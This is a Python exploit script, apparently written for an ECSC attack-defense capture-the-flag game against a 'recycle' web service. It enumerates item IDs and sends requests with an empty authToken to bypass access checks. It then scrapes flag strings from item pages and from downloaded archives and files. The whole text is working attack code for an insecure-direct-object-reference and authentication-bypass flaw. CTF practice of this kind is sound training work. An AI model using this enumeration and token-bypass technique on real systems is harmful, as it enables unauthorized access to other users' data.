#!/usr/bin/env python3
import re
import requests
import os
from bs4 import BeautifulSoup
import random
import time
import io
import tarfile

FLAG_REGEX = r"ECSC_[A-Za-z0-9\+/]{32}"

host = os.environ.get("target", "localhost:8080")
startid = int(os.environ.get("startid", 0))

host = "http://" + host

for i in range(startid, startid+100):
    print("Physical " + str(i) + ": ", end="")
    r = requests.get(host + "/recycle/myitems/physical/" + str(i) + "?authToken=", timeout=5)
    if r.status_code == 404:
        print("Does not exist. => Everything enumerated")
        break
    if r.url.endswith("/login"):
        print("Has an authToken attached")
        continue
    bs = BeautifulSoup(r.text, "html.parser")
    flag_container = bs.find_all('dd')[1]
    if flag_container:
        flag = flag_container.get_text()
        if re.match(FLAG_REGEX, flag):
            print(flag)
        else:
            print("not a valid flag")

for i in range(startid, startid+100):
    print("Digital " + str(i) + ": ", end="")
    r = requests.get(host + "/recycle/myitems/digital/" + str(i) + "/download?authToken=", timeout=5)
    if r.status_code == 404:
        print("Does not exist. Everything enumerated. Done.")
        break
    if r.url.endswith("/login"):
        print("Has an authToken attached")
        continue

    content = r.content
    d = r.headers['content-disposition']
    fname = re.findall("filename=\"(.+)\"", d)[0]

    def parse_flags(content: bytes):
        results = re.findall(FLAG_REGEX, content.decode('latin-1'))
         # print (f"Got {len(results)} flags")
        for result in results:
            print(result)

    def parseTar(content, enc):
        tarstrio = io.BytesIO(content)
        tar = tarfile.open(fileobj=tarstrio)

        files = tar.getmembers()
        for f in files:
            print(f.name)
            fcontent = tar.extractfile(f).read()
            parse_flags(fcontent)


    if fname[-3:] == "tar":
        parseTar(content, "tar")
    elif fname[-3:] == "bz2":
        parseTar(content, "bz2")
    elif fname[-2:] == "gz":
        parseTar(content, "gz")
    elif fname[-3:] in ['gif', 'png', 'jpg', 'txt'] or fname[-2:] == 'md':
        parse_flags(content)
    else:
        print(f"Ignoring: {fname}")
